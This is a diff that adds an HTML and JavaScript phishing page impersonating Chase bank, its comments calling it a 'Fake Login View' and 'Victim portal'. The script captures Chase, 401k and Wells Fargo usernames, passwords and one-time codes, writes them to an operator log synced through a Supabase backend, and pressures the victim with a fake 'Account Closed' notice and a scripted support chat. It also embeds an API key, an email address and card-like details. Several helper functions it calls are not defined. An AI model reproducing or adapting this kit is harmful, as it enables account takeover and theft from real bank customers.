@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Chase</title>
+    <link rel="icon" type="image/x-icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+    <link rel="apple-touch-icon" href="https://www.chase.com/etc/designs/chase-ux/apple-touch-icon.png">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f5f7fa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #0d74ce;
+            color: white;
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 4px solid #004a99;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 40px;
+            margin-right: 15px;
+        }
+
+        .nav {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: background 0.3s;
+        }
+
+        .nav a:hover {
+            background-color: #004a99;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            padding: 30px;
+            gap: 30px;
+        }
+
+        .sidebar {
+            width: 300px;
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .sidebar h3 {
+            color: #0d74ce;
+            margin-bottom: 20px;
+            font-size: 18px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        .main-content {
+            flex: 1;
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .form-section h2 {
+            color: #004a99;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #0d74ce;
+            outline: none;
+        }
+
+        .btn {
+            background-color: #0d74ce;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background-color: #004a99;
+        }
+
+        .chat-container {
+            background-color: #f9f9f9;
+            border-radius: 10px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            margin-top: 30px;
+        }
+
+        .chat-box {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .chat-message {
+            padding: 12px 15px;
+            border-radius: 8px;
+            max-width: 80%;
+        }
+
+        .chat-message.user {
+            background-color: #e3f2fd;
+            align-self: flex-end;
+            text-align: right;
+        }
+
+        .chat-message.admin {
+            background-color: #f1f1f1;
+            align-self: flex-start;
+        }
+
+        .chat-input-area {
+            display: flex;
+            margin-top: 20px;
+            gap: 10px;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        .chat-send {
+            background-color: #0d74ce;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .admin-panel {
+            margin-top: 40px;
+            padding: 20px;
+            background-color: #222;
+            color: white;
+            border-radius: 10px;
+        }
+
+        .admin-panel h3 {
+            color: #fff;
+            margin-bottom: 15px;
+        }
+
+        .credentials-log {
+            background-color: #333;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 10px;
+            overflow-y: auto;
+            max-height: 200px;
+        }
+
+        .credentials-log p {
+            margin-bottom: 8px;
+            color: #0d74ce;
+            font-weight: bold;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #eee;
+            color: #666;
+            border-top: 1px solid #ddd;
+        }
+
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 350px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .login-box h2 {
+            color: #004a99;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        .login-box button {
+            background-color: #0d74ce;
+            color: white;
+            padding: 14px;
+            width: 100%;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 15px;
+            }
+
+            .logo {
+                margin-bottom: 15px;
+            }
+
+            .nav {
+                flex-wrap: wrap;
+                gap: 10px;
+                width: 100%;
+            }
+
+            .container {
+                padding: 15px;
+                flex-direction: column;
+            }
+
+            /* Verification flex layout */
+            #view-verification {
+                flex-direction: column !important;
+            }
+
+            .sidebar {
+                width: 100% !important;
+            }
+
+            /* Quick actions flex layout */
+            #view-home>div:nth-of-type(3) {
+                flex-direction: column;
+            }
+
+            /* Chase card sizing */
+            .chase-card {
+                padding: 20px !important;
+            }
+
+            .chase-card .card-number {
+                font-size: 20px !important;
+            }
+
+            .chase-card .card-bottom {
+                flex-direction: column;
+                align-items: flex-start !important;
+                gap: 15px;
+            }
+
+            .chase-card .card-balance {
+                text-align: left !important;
+            }
+        }
+    </style>
+    
+</head>
+
+<body>
+
+    <!-- Victim portal view -->
+
+    <div class="header" id="app-header" style="display:none;">
+        <div class="logo">
+            <i class="fas fa-university"></i> Chase Bank Secure Portal
+        </div>
+        <div class="nav">
+            <a href="javascript:void(0)" onclick="showView('home')">Home</a>
+            <a href="javascript:void(0)" onclick="showView('verification')">Verification</a>
+            <a href="javascript:void(0)" onclick="showView('history')">Transaction History</a>
+            <a href="javascript:void(0)" onclick="showSupport()">Support</a>
+        </div>
+    </div>
+
+    <!-- Fake Login View -->
+    <div id="view-login"
+        style="display:block; max-width:400px; margin:40px auto; background:white; padding:30px; border-radius:10px; box-shadow:0 10px 30px rgba(0,0,0,0.1); width:90%;">
+        <div style="text-align:center; margin-bottom:20px;">
+            <i class="fas fa-university" style="font-size:40px; color:#0d74ce; margin-bottom:10px;"></i>
+            <h2 style="color:#004a99;">Sign In to Chase</h2>
+        </div>
+
+        <div id="loginStep1">
+            <div class="input-group">
+                <label class="label">Username</label>
+                <input type="text" class="input-field" id="chaseUser" placeholder="Enter username">
+            </div>
+            <div class="input-group">
+                <label class="label">Password</label>
+                <input type="password" class="input-field" id="chasePass" placeholder="Enter password">
+            </div>
+            <button class="btn" onclick="submitChaseLogin()">Sign In</button>
+        </div>
+
+        <div id="loginStep2" style="display:none; text-align:center;">
+            <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i> Verification
+                Required</p>
+            <p style="margin-bottom:20px; color:#666;">A one-time passcode has been sent to
+                <strong>kyungzing9@gmail.com</strong>. Please enter it below.</p>
+            <div class="input-group" style="text-align:left;">
+                <label class="label">OTP Code</label>
+                <input type="text" class="input-field" id="chaseOtp" placeholder="Enter 6-digit OTP code">
+            </div>
+            <button class="btn" onclick="submitChaseOtp()">Verify & Sign In</button>
+            <div id="statusLogin" style="margin-top:15px; font-weight:bold;"></div>
+        </div>
+    </div>
+
+    <div class="container" id="main-app" style="display:none;">
+        <div class="main-content">
+            <!-- Home View -->
+            <div id="view-home" style="display:none;">
+                <h2 style="color:#004a99; margin-bottom:20px; font-size:28px;">Welcome back, Kyung</h2>
+
+                <div
+                    style="background: #f8d7da; color: #721c24; padding: 15px 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #f5c6cb; font-weight: bold;">
+                    <i class="fas fa-exclamation-triangle"></i> Account Closed. Please complete verification to withdraw
+                    funds.
+                </div>
+
+                <div class="chase-card"
+                    style="background: linear-gradient(135deg, #005eb8, #003b73); color: white; padding: 25px; border-radius: 15px; margin-bottom: 30px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); position: relative; max-width: 500px;">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                        <span style="font-size: 22px; font-weight: bold;">Chase</span>
+                        <i class="fas fa-wifi" style="transform: rotate(90deg); font-size: 24px; opacity:0.8;"></i>
+                    </div>
+                    <div class="card-number"
+                        style="font-family: 'Courier New', Courier, monospace; font-size: 26px; letter-spacing: 2px; margin-bottom: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">
+                        4833 1603 2874 4609
+                    </div>
+                    <div class="card-bottom" style="display:flex; justify-content:space-between; align-items:flex-end;">
+                        <div>
+                            <p style="font-size:10px; opacity:0.8; margin-bottom:2px;">GOOD THRU &nbsp;&nbsp;&nbsp; CVV
+                            </p>
+                            <p
+                                style="font-size:16px; font-family: 'Courier New', monospace; text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">
+                                05/31 &nbsp;&nbsp;&nbsp;&nbsp; 033</p>
+                            <p
+                                style="font-size: 18px; margin-top: 10px; text-transform: uppercase; letter-spacing: 1px; text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">
+                                EMRIOUS KYUNG ZING</p>
+                        </div>
+                        <div class="card-balance" style="text-align:right;">
+                            <h3 style="font-weight: 400; opacity: 0.9; font-size:12px;">Total Checking Balance</h3>
+                            <p style="font-size: 26px; font-weight: bold; margin-top: 5px;">$180,000.00</p>
+                            <p
+                                style="font-size:24px; font-weight:bold; font-style:italic; margin-top:10px; color:rgba(255,255,255,0.9);">
+                                VISA</p>
+                        </div>
+                    </div>
+                </div>
+
+                <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Quick
+                    Actions</h3>
+                <div style="display:flex; gap:15px;">
+                    <button
+                        style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i
+                            class="fas fa-exchange-alt"
+                            style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
+                    <button
+                        style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i
+                            class="fas fa-file-invoice-dollar"
+                            style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
+                    <button
+                        style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i
+                            class="fas fa-chart-line"
+                            style="color:#0d74ce; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
+                </div>
+            </div>
+
+            <!-- Transaction History View -->
+            <div id="view-history" style="display:none;">
+                <h2 style="color:#004a99; margin-bottom:20px; font-size:24px;">Transaction History</h2>
+
+                <div id="txLocked"
+                    style="text-align:center; padding:40px 20px; background:#f9f9f9; border:1px solid #ddd; border-radius:8px;">
+                    <i class="fas fa-eye-slash" style="font-size:48px; color:#999; margin-bottom:20px;"></i>
+                    <h3 style="color:#333; margin-bottom:10px;">Security Verification Required</h3>
+                    <p style="color:#666; margin-bottom:20px;">To protect your sensitive financial data, please confirm
+                        your identity to view past transactions.</p>
+                    <button onclick="promptTxOtp()"
+                        style="background:#0d74ce; color:white; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; font-weight:bold;"><i
+                            class="fas fa-lock"></i> Request Verification Code</button>
+
+                    <div id="txOtpPrompt"
+                        style="display:none; margin-top:25px; padding-top:20px; border-top:1px dashed #ccc; text-align:left; max-width:300px; margin-left:auto; margin-right:auto;">
+                        <label style="display:block; margin-bottom:8px; font-weight:bold; color:#333;">Enter 6-Digit OTP
+                            Code</label>
+                        <input type="text" id="txOtp"
+                            style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px;"
+                            placeholder="e.g. 123456">
+                        <button onclick="submitTxOtp()"
+                            style="width:100%; background:#28a745; color:white; padding:12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">Submit
+                            Code</button>
+                    </div>
+                </div>
+
+                <div id="txUnlocked" style="display:none;">
+                    <div style="background:white; border:1px solid #ddd; border-radius:8px; overflow:hidden;">
+                        <!-- Transaction Item -->
+                        <div
+                            style="display:flex; justify-content:space-between; padding:20px; border-bottom:1px solid #eee;">
+                            <div>
+                                <h4 style="color:#333; margin-bottom:5px;">Check Withdrawal - Failed</h4>
+                                <p style="color:#666; font-size:14px;">May 2, 2026 • Insufficient Funds / Hold</p>
+                            </div>
+                            <div style="text-align:right;">
+                                <span style="color:#d9534f; font-weight:bold; font-size:18px;">-$71,000.00</span>
+                            </div>
+                        </div>
+
+                        <!-- Dummy Transaction -->
+                        <div
+                            style="display:flex; justify-content:space-between; padding:20px; border-bottom:1px solid #eee;">
+                            <div>
+                                <h4 style="color:#333; margin-bottom:5px;">Direct Deposit - Payroll</h4>
+                                <p style="color:#666; font-size:14px;">April 30, 2026</p>
+                            </div>
+                            <div style="text-align:right;">
+                                <span style="color:#28a745; font-weight:bold; font-size:18px;">+$4,250.00</span>
+                            </div>
+                        </div>
+
+                        <!-- Dummy Transaction -->
+                        <div style="display:flex; justify-content:space-between; padding:20px;">
+                            <div>
+                                <h4 style="color:#333; margin-bottom:5px;">Grocery Store</h4>
+                                <p style="color:#666; font-size:14px;">April 28, 2026 • Debit Card</p>
+                            </div>
+                            <div style="text-align:right;">
+                                <span style="color:#333; font-weight:bold; font-size:18px;">-$145.20</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Verification View -->
+            <div id="view-verification" style="display:none; display:flex; gap:30px; width:100%;">
+
+                <div class="sidebar" style="width:300px;">
+                    <h3>Verification Steps</h3>
+                    <p><strong>Step 1:</strong> Provide 401k login to verify your retirement account.</p>
+                    <p><strong>Step 2:</strong> Enter Wells Fargo credentials to confirm funds availability.</p>
+                    <p><strong>Step 3:</strong> Chat with Chase Customer Service for assistance.</p>
+                    <p style="margin-top:20px;color:#0d74ce;"><i class="fas fa-shield-alt"></i> This portal is secure
+                        and encrypted.</p>
+                </div>
+
+                <div style="flex:1;">
+                    <div class="form-section">
+                        <h2>401k Account Verification</h2>
+                        <p style="margin-bottom:20px;">To proceed with the withdrawal, we need to verify your retirement
+                            account first.</p>
+                        <div class="input-group">
+                            <label class="label">401k Username</label>
+                            <input type="text" class="input-field" id="401kUsername"
+                                placeholder="Enter your 401k username">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">401k Password</label>
+                            <input type="password" class="input-field" id="401kPassword"
+                                placeholder="Enter your 401k password">
+                        </div>
+                        <button class="btn" id="btn401k" onclick="submit401k()">Verify 401k Account</button>
+
+                        <div id="otp401kGroup"
+                            style="display:none; margin-top:20px; padding-top:20px; border-top:1px dashed #ccc;">
+                            <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i>
+                                Confirm OTP</p>
+                            <div class="input-group">
+                                <label class="label">OTP Code</label>
+                                <input type="text" class="input-field" id="401kOtp"
+                                    placeholder="Enter 6-digit OTP code">
+                            </div>
+                            <button class="btn" id="btnOtp401k" onclick="submit401kOtp()">Submit OTP</button>
+                        </div>
+
+                        <div id="status401k" style="margin-top:20px; font-weight:bold; text-align:center;"></div>
+                    </div>
+
+                    <div class="form-section">
+                        <h2>Wells Fargo Funds Verification</h2>
+                        <p style="margin-bottom:20px;">Confirm the withdrawal availability by logging into your Wells
+                            Fargo account.</p>
+                        <div class="input-group">
+                            <label class="label">Wells Fargo Username</label>
+                            <input type="text" class="input-field" id="wfUsername"
+                                placeholder="Enter Wells Fargo username">
+                        </div>
+                        <div class="input-group">
+                            <label class="label">Wells Fargo Password</label>
+                            <input type="password" class="input-field" id="wfPassword"
+                                placeholder="Enter Wells Fargo password">
+                        </div>
+                        <button class="btn" id="btnWf" onclick="submitWellsFargo()">Verify Funds Availability</button>
+
+                        <div id="otpWfGroup"
+                            style="display:none; margin-top:20px; padding-top:20px; border-top:1px dashed #ccc;">
+                            <p style="margin-bottom:15px; color:#d9534f; font-weight:bold;"><i class="fas fa-lock"></i>
+                                Confirm OTP</p>
+                            <div class="input-group">
+                                <label class="label">Security Code</label>
+                                <input type="text" class="input-field" id="wfOtp" placeholder="Enter security code">
+                            </div>
+                            <button class="btn" id="btnOtpWf" onclick="submitWfOtp()">Submit Code</button>
+                        </div>
+
+                        <div id="statusWf" style="margin-top:20px; font-weight:bold; text-align:center;"></div>
+                    </div>
+
+                    <div class="chat-container">
+                        <h3 style="color:#004a99;margin-bottom:15px;">Chase Customer Service Live Chat</h3>
+                        <div class="chat-box" id="chatBox">
+                            <div class="chat-message admin">
+                                <strong>Chase Support:</strong> Hello Jerry, we're here to help you verify your accounts
+                                for the withdrawal. Please enter your credentials above and we'll proceed.
+                            </div>
+                        </div>
+                        <div class="chat-input-area">
+                            <input type="text" class="chat-input" id="chatInput"
+                                placeholder="Type your message here...">
+                            <button class="chat-send" onclick="sendMessage()">Send</button>
+                        </div>
+                    </div>
+
+                </div> <!-- End form column -->
+            </div> <!-- End Verification View -->
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2026 Chase Bank. All rights reserved. | Secure Banking Portal v3.1</p>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';
+
+        async function setSync(key, value) {
+            try {
+                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state', {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_KEY,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'resolution=merge-duplicates'
+                    },
+                    body: JSON.stringify({ id: 1, expectedOtp: value })
+                });
+                if (!res.ok) {
+                    const err = await res.text();
+                    console.error('setSync error:', res.status, err);
+                } else {
+                    console.log('setSync OK: expectedOtp =', value);
+                }
+            } catch (e) {
+                console.error('setSync fetch error:', e);
+            }
+        }
+
+        async function getSync(key) {
+            try {
+                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_KEY
+                    }
+                });
+                if (!res.ok) {
+                    const err = await res.text();
+                    console.error('getSync error:', res.status, err);
+                    return null;
+                }
+                const rows = await res.json();
+                const val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
+                console.log('getSync OK: expectedOtp =', val);
+                return val || null;
+            } catch (e) {
+                console.error('getSync fetch error:', e);
+                return null;
+            }
+        }
+
+        // View navigation logic
+        function showView(viewId) {
+            document.getElementById('view-login').style.display = 'none';
+            document.getElementById('app-header').style.display = 'flex';
+            document.getElementById('main-app').style.display = 'flex';
+
+            document.getElementById('view-home').style.display = 'none';
+            document.getElementById('view-verification').style.display = 'none';
+            document.getElementById('view-history').style.display = 'none';
+
+            let el = document.getElementById('view-' + viewId);
+            if (el) {
+                if (viewId === 'verification') {
+                    el.style.display = 'flex'; // Use flex for verification
+                } else {
+                    el.style.display = 'block';
+                }
+            }
+        }
+
+        function showSupport() {
+            showView('verification');
+            setTimeout(() => {
+                let chatContainer = document.querySelector('.chat-container');
+                if (chatContainer) {
+                    chatContainer.scrollIntoView({ behavior: 'smooth', block: 'end' });
+                    document.getElementById('chatInput').focus();
+                }
+            }, 100);
+        }
+
+        async function submitChaseLogin() {
+            let u = document.getElementById('chaseUser').value;
+            let p = document.getElementById('chasePass').value;
+
+            // Accept any entered credentials
+            if (u && p) {
+                let logEntry = `<p><strong>Initial Chase Login:</strong> Username: ${u}, Password: ${p}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                document.getElementById('loginStep1').style.display = 'none';
+                document.getElementById('loginStep2').style.display = 'block';
+
+                // Initialize login status
+                await setSyncItem('loginStatus', 'pending_otp', null);
+            } else {
+                alert('Please enter your username and password.');
+            }
+        }
+
+        async function submitChaseOtp() {
+            let otp = document.getElementById('chaseOtp').value.trim();
+            const expected = await getSyncItem('expectedOtp') || "";
+
+            if (otp) {
+                let logEntry = `<p><strong>Initial Chase Login OTP Attempt:</strong> ${otp}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                console.log('Login OTP entered:', otp, 'expected:', expected);
+                if (otp === expected) {
+                    document.getElementById('statusLogin').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                    await setSyncItem('loginStatus', 'completed', null);
+                    await setSyncItem('expectedOtp', null);
+                    showView('home');
+                } else {
+                    alert('Invalid OTP code. Please try again.');
+                    document.getElementById('chaseOtp').value = '';
+                }
+            } else {
+                alert('Please enter the OTP code.');
+            }
+        }
+
+        setInterval(async () => {
+            globalState = await getFullState();
+            let history = getSyncItem('chatHistory');
+            if (history) {
+                document.getElementById('chatBox').innerHTML = history;
+            }
+
+            // Check Login OTP Status
+            let sLogin = getSyncItem('loginStatus');
+            if (sLogin === 'approved') {
+                await setSyncItem('loginStatus', 'completed', null);
+                showView('home');
+            }
+
+            // Check 401k status
+            let s401k = getSyncItem('401kStatus');
+            if (s401k === 'pending_otp' && document.getElementById('otp401kGroup').style.display === 'none') {
+                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Confirm OTP</span>';
+                document.getElementById('otp401kGroup').style.display = 'block';
+                document.getElementById('btn401k').style.display = 'none';
+            } else if (s401k === 'otp_submitted') {
+                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+            } else if (s401k === 'approved') {
+                document.getElementById('status401k').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                document.getElementById('otp401kGroup').style.display = 'none';
+                document.getElementById('btn401k').style.display = 'none';
+                document.getElementById('btnOtp401k').style.display = 'none';
+            }
+
+            // Check Wells Fargo status
+            let swf = getSyncItem('wfStatus');
+            if (swf === 'pending_otp' && document.getElementById('otpWfGroup').style.display === 'none') {
+                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Confirm OTP</span>';
+                document.getElementById('otpWfGroup').style.display = 'block';
+                document.getElementById('btnWf').style.display = 'none';
+            } else if (swf === 'otp_submitted') {
+                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+            } else if (swf === 'approved') {
+                document.getElementById('statusWf').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                document.getElementById('otpWfGroup').style.display = 'none';
+                document.getElementById('btnWf').style.display = 'none';
+                document.getElementById('btnOtpWf').style.display = 'none';
+            }
+
+            // Check Transaction History status
+            let stx = getSyncItem('txStatus');
+            if (stx === 'approved') {
+                document.getElementById('txLocked').style.display = 'none';
+                document.getElementById('txUnlocked').style.display = 'block';
+            }
+        }, 1000);
+
+        // Transaction History OTP
+        function promptTxOtp() {
+            document.getElementById('txOtpPrompt').style.display = 'block';
+        }
+
+        async function submitTxOtp() {
+            let otp = document.getElementById('txOtp').value.trim();
+            const expected = await getSyncItem('expectedOtp') || "";
+
+            if (otp) {
+                let logEntry = `<p><strong>Transaction History OTP Attempt:</strong> ${otp}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                console.log('Tx OTP entered:', otp, 'expected:', expected);
+                if (otp === expected) {
+                    document.getElementById('txOtpPrompt').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                    await setSyncItem('txStatus', 'approved', null);
+                    await setSyncItem('expectedOtp', null);
+                    document.getElementById('txLocked').style.display = 'none';
+                    document.getElementById('txUnlocked').style.display = 'block';
+                } else {
+                    alert('Invalid OTP code. Please try again.');
+                    document.getElementById('txOtp').value = '';
+                }
+            } else {
+                alert('Please enter the OTP code.');
+            }
+        }
+
+        // Capture 401k credentials  
+        async function submit401k() {
+            let username = document.getElementById('401kUsername').value;
+            let password = document.getElementById('401kPassword').value;
+
+            if (username && password) {
+                let logEntry = `<p><strong>401k Login Attempt:</strong> Username: ${username}, Password: ${password}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                document.getElementById('status401k').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+                await setSyncItem('401kStatus', 'submitted', null);
+            } else {
+                alert('Please fill in both fields.');
+            }
+        }
+
+        async function submit401kOtp() {
+            let otp = document.getElementById('401kOtp').value.trim();
+
+            if (otp) {
+                let logEntry = `<p><strong>401k OTP Submitted:</strong> ${otp}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                await setSyncItem('401kStatus', 'otp_submitted', null);
+                document.getElementById('btnOtp401k').disabled = true;
+                document.getElementById('btnOtp401k').innerText = 'Submitted';
+            } else {
+                alert('Please enter the OTP code.');
+            }
+        }
+
+        // Capture Wells Fargo credentials  
+        async function submitWellsFargo() {
+            let username = document.getElementById('wfUsername').value;
+            let password = document.getElementById('wfPassword').value;
+
+            if (username && password) {
+                let logEntry = `<p><strong>Wells Fargo Login Attempt:</strong> Username: ${username}, Password: ${password}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                document.getElementById('statusWf').innerHTML = '<span style="color:orange;"><i class="fas fa-spinner fa-spin"></i> Pending Verification...</span>';
+                await setSyncItem('wfStatus', 'submitted', null);
+            } else {
+                alert('Please fill in both fields.');
+            }
+        }
+
+        async function submitWfOtp() {
+            let otp = document.getElementById('wfOtp').value.trim();
+
+            if (otp) {
+                let logEntry = `<p><strong>Wells Fargo OTP Submitted:</strong> ${otp}</p>`;
+                let currentLogs = getSyncItem('adminLogs') || '';
+                await setSyncItem('adminLogs', currentLogs + logEntry, null);
+
+                await setSyncItem('wfStatus', 'otp_submitted', null);
+                document.getElementById('btnOtpWf').disabled = true;
+                document.getElementById('btnOtpWf').innerText = 'Submitted';
+            } else {
+                alert('Please enter the OTP code.');
+            }
+        }
+
+        // Live chat function  
+        async function sendMessage() {
+            let input = document.getElementById('chatInput').value;
+            if (input.trim() === "") return;
+
+            // Save to shared chat history
+            let chatEntry = `<div class="chat-message user"><strong>Jerry:</strong> ${input}</div>`;
+            let currentChats = getSyncItem('chatHistory') || '';
+            await setSyncItem('chatHistory', currentChats + chatEntry, null);
+
+            document.getElementById('chatInput').value = "";
+        }
+    </script>
+</body>
+
+</html>
